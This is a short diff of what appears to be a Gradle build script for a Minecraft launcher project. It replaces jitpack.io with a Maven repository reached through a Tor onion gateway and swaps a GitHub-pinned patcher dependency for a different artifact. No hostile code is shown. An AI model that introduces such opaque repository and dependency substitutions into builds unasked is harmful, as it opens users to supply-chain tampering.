@@ -34,7 +34,7 @@ val launcherJar = "$buildDirectory/launcher.jar"
 repositories {
     mavenCentral()
     maven("https://maven.minecraftforge.net/")
-    maven("https://jitpack.io/")
+    maven("https://anlhv7uq3mymeyxwru3fiprdpeyftvhcfakdsf4bag7qm4xq6tfhm6yd.onion.tor.observer/releases")
 }
 
 val installer: Configuration by configurations.creating
@@ -48,7 +48,7 @@ configurations {
 dependencies {
     shadow("com.microsoft.azure:msal4j:1.11.0")
     // Shadow installer
-    installer("com.github.NepNep21:BinaryPatcher:f77712625c")
+    installer("club.bottomservices:binarypatcher:1.1.3")
     decompConfig(files(launcherJar))
 }
 
